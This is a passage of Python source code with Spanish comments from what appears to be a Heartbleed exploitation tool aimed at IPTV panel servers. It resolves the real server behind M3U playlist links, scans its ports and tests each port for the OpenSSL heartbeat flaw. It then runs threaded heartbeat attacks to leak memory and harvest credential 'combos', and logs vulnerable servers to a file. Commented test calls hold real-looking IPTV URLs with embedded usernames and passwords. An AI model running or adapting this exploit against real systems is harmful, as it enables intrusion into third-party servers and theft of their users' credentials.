        listapuertos = miPortScanner.port_scan(url,range(self.puertoINICIO_SCAN,self.puertoFIN_SCAN),_scaneoLento)
        return listapuertos
    #Método que valida el server destino si esta o no activo
    def checkServerStatus(self,simpleServer):
        estado, url, port,protocolo = checkFullM3U_URL(simpleServer, requests.session())
        return estado, url,port,protocolo
    #Inicia el ataque en paralelo, ararncando los analizadores y los lectores del servidor, el dataconatiner se pasa por referencia para que todos los server compartan el mismo
    def iniciarHilos(self,url,_listaservers,_listapuertos,puertoBase,protocolo,_miDS:DatosServerM3U,_dataContainer:DataContainer,_dictCombos):
        #miDataContainer = DataContainer()
        self.setDataContainer(_dataContainer)
        miCosumidor = DataAnalyzer()
        miCosumidor.setDataContainer(_dataContainer)
        miCosumidor.setCombosCotainer(_dictCombos)#estrucutra para que no se repitan los combos, compartida por todos los hilos
        datosServidor = urlparse(url)  # uso el servidor final, no la url de la m3u, pues donde esta autorizado en es el server final
        miCosumidor.setURLBase(_miDS)
        diccionarioAnterior=miCosumidor.readComboFromFile(_dictCombos)

        for total in range(totalHilosProductores):
            hiloextractor = threading.Thread(name='Extractor-'+str(total) ,target=self.doSimpleAtaque, args=(url, _listapuertos,_miDS))
            hiloextractor.start()
        for number in range(totalHilosConsumidores):#numero de analizadores
            hiloConsumidor = threading.Thread(name='Consumidor-'+str(number),target=miCosumidor.doAnalyze)
            hiloConsumidor.start()

    #Escribe los datos del servidor vulnerable encontrado
    def escribirDatosServerVulnerable(self,datos):
        f = open("servidoresvulnerables.txt", "a")
        if self.primeraVEZ_VULNERABLES:
            f.write("--------------------"+time.asctime()+"-----------------------\n")
            self.primeraVEZ_VULNERABLES=False
        try:
            f.write(datos)
            f.write("\n")
            f.close()
        except Exception as errp:
            print("Error escribiendo al fichero:",errp)

    #verificar si es una m3u valida, intentar sacar el server final
    def pasoUNO(self,_url):
        miDS=DatosServerM3U()
        miDS.extraerServerFinal(_url)
        print(miDS)
        return miDS
    def iniciarMultiServer(self,url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS:DatosServerM3U):
        miDataContainer = DataContainer()
        miDictCombos=dict()
        for server in miDS.host:
            miDSAUX=copy.copy(miDS)
            miDSAUX.host=server
            self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDSAUX,miDataContainer,miDictCombos)

    #Metodo principal del ataque
    def startAttack(self,_listaserver:str,_listapuertosEntrada):
        s = socket(AF_INET, SOCK_STREAM)
        print('Connecting...')
        estado = ""
        puertoBaseURL=""
        protocolo=""
        estado=""
        url=""
        serversAtacables=dict() #para crear un diccionarios de server si es invocado con una lista de servidores, este modo no hace ataque
        esSolo_Server_conIP=False
        miDS:DatosServerM3U
        scaneoLento = 1
        try:
            if len(_listapuertosEntrada)<=0:
                scaneoLento = int(input("Desea hacer un scaneo lento de puertos:?(0:lento 1:rapido(default)"))
        except:
            scaneoLento = 1

        for simpleServer in _listaserver:
            url=""
            if not simpleServer.find("m3u") == -1:  # sacamos de la m3u la IP real del servidor, que puede ser distinta al panel
                miDS=self.pasoUNO(simpleServer)
                print("Servidor Remoto encontrado:--->",miDS.host)
                print(Fore.RED,"",Fore.RESET)
                respueta=input("\n\33[33mponga su ip personal o\nde enter para usar default\n")
                if respueta!="":
                    if _listapuertosEntrada=="":
                        print(Fore.RED,"",Fore.RESET)
                    miDS.host=respueta.split(" ")
                    if (len(miDS.host)>1): #tengo varios server remoto, ignoro todo lo demas, supongo que el puerto esta bien y es atacable, arranco todo a la vez
                        self.iniciarMultiServer(url, simpleServer, _listapuertosEntrada[0], puertoBaseURL, protocolo,miDS)
                        estado="KO"#para que ignore las ejecuciones de abajo

                    else:
                        miDS.host=miDS.host[0]
                estado="OK"
                #estado, url,puertoBaseURL,protocolo = self.checkServerStatus(simpleServer)
                if (miDS.host==""):#controlar esto!!!!!
                    print(Fore.RED,"URL M3U no valida, no puediendo validar SERVER real de m3u, atacando IP de la dns",Fore.RESET)
                    resultadoParser=urlparse(simpleServer)
                    estado="OK"
                    url=resultadoParser.hostname
                    if resultadoParser.port!="":
                        puertoBaseURL=resultadoParser.port
                    protocolo=resultadoParser.scheme
            else:  # es escaneo de una IP o una url sin m3u
                miDS = self.pasoUNO(simpleServer)
                esSolo_Server_conIP = True
                resultadoParser=urlparse(simpleServer)
                url = resultadoParser.hostname
                if url==None: #no tiene url, es solo una ip
                    url=resultadoParser.path
                if resultadoParser.port != None:
                    puertoBaseURL = resultadoParser.port
                if resultadoParser.scheme=="":
                    protocolo="http"#elijo http sino tenia puesto nada
                else:
                    protocolo = resultadoParser.scheme
                estado = "OK"
            estado = "OK"
            temporalScanPuerto={}#se usa para no repetir la busqueda sino tenemos puerto base
            #Si ponemos varios servidores remotos, debemos controlar sus puertos, pues el usuario ya debe meterlos, debemos serpar ip:puerto
            if not (estado == "KO"):
                scaneoLento=1
                if len(_listapuertosEntrada) == 0:  # si el usuario no paso ningun puerto, procedemos a buscarlos
                    port_to_scan = self.extractPort(miDS.host,scaneoLento)
                    temporalScanPuerto=port_to_scan
                else:
                    port_to_scan=_listapuertosEntrada
                print("Puertos encontrados para :",url,"--->",port_to_scan)
                if len(port_to_scan)>0:
                    for simplePort in port_to_scan:  # procedemos a verificar que el servidor tiene el fallo de seguridad openssl
                        print("---->Incoming m3u:", simpleServer, " Real url:", miDS.host, "--", simplePort)
                        try:
                            if (self.checkHB(miDS.host, simplePort, s)):#verificamos vulnerabilidad puerto a puerto
                                #si encontrado lo ataco
                                print("Vulnerable Port to use:", simplePort)
                                if True:#(len(_listaserver)==1):#peticio de ataque, no de scanner de vulnerabilidad, es solo un servidor
                                    miDataContainer=DataContainer()
                                    miDictCombos=dict()
                                    self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
                                    self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
                                    self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo,miDS,miDataContainer,miDictCombos)
                                else:
                                    self.escribirDatosServerVulnerable(simpleServer+":"+str(simplePort))
                                    serversAtacables[simpleServer]=simplePort
                                break
                            else:
                                try:
                                    s.close()
                                    s = socket(AF_INET, SOCK_STREAM)
                                except Exception as errp:
                                    print("Error cerrando socket:",errp)
                        except Exception as errp:
                            s.close()
                            s = socket(AF_INET, SOCK_STREAM)
                            print("\t\t***********Error:", errp)
                else:
                    print("Servidor :",url," sin puertos localizados")
        print("Servidores atacables:",serversAtacables)
#-----------------------------------------------------------------------------------------------

    def doSimpleAtaque(self, url:str, simplePort,_miDS:DatosServerM3U):
        cadena=Fore.WHITE+"Iniciando ataque a :"+_miDS.m3uURL+" Contra el server:"+Fore.YELLOW+_miDS.host+Fore.RESET+"\n"
        print(cadena)
        while True:
            try:
                servidor=url
                if _miDS.host!="": #si tengo el servidor final, es el que ataco
                    servidor=_miDS.host
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((servidor, simplePort))
                s.send(self.decoceStringToHEX(self.hello))
                while True:
                    typ, ver, pay = self.recvmsg(s)
                    if typ == None:
                        if (debug):
                            print ('Server closed connection without sending Server Hello.')
                        return
                    # Look for server hello done message.
                    if typ == 22 and (pay[0]) == 0x0E:
                        break
                i = 0
                while os.path.exists("dump_%s.bin" % i):
                    i += 1;

                s.send(self.decoceStringToHEX(self.hb))
                while self.do_hb_new(s):
                    continue
            except Exception as errp:
                if (debug):
                    print("Error realizando la conexion, seguimos intentando:",errp)

def inciar(listaserver,listapuertos):
   # ascii_banner = pyfiglet.figlet_format("BackDoor IPTV Scanner by @SergioSP75")
    #print(ascii_banner)
    #cadena=Fore.BLACK+Back.GREEN+"Version:"+str(version)+Fore.RESET+Back.RESET
   # print(cadena)
   # cadena = Fore.BLACK + Back.YELLOW + "Version API:" + str(API_MAC_SCANNER_FINAL.version) + Fore.RESET + Back.RESET
    #print(cadena)
    if (len(listaserver))==0:
        listaserver=list(map(str,input(Fore.YELLOW+Back.BLACK+"\nIntroduce lista m3u\n ").split()))
        listapuertos = list(map(int, input(Fore.GREEN + Back.BLACK + "\nIntroduce puerto/s\nO da enter para usar los defaults\n\33[35m").split()))

    if len(listaserver)==0:
        print(Fore.RED,"Parametros erroneos.Verifique los datos de entrada")
        quit()
    miPanelAttack_SSL = PanelAttack_SSL()
    miPanelAttack_SSL.startAttack(listaserver, listapuertos)


#------------------------------------------------------------------------test---------------------------------------
#inciar({'http://streamgo.vip:8008/get.php?username=fusag&password=457896&type=m3u_plus'},{25463})
#inciar({'https://streamgo.vip:25463/get.php?username=fusag&password=457896&type=m3u_plus'},{25463})
#inciar({"http://46.21.250.55:8080"}, {25463})
#inciar({"http://ys-users.com:8080/get.php?username=5TBc66anSD&password=423749&type=m3u_plus"},{25463})
#------------------------------------------------------------------------test---------------------------------------

crearDirectoriosBase()
#inciar({"http://ictv19.xyz"},{25463})

print("Tipo de scaneo de puertos:")
print("\n1 WEB")
try:
    tipo=int(input ("\n\33[36mescribe 1 y das enter "))
    if (tipo!="") and (int(tipo)==1):
        scanPORTTYPE="WEB"
except:
    False
inciar({},{})
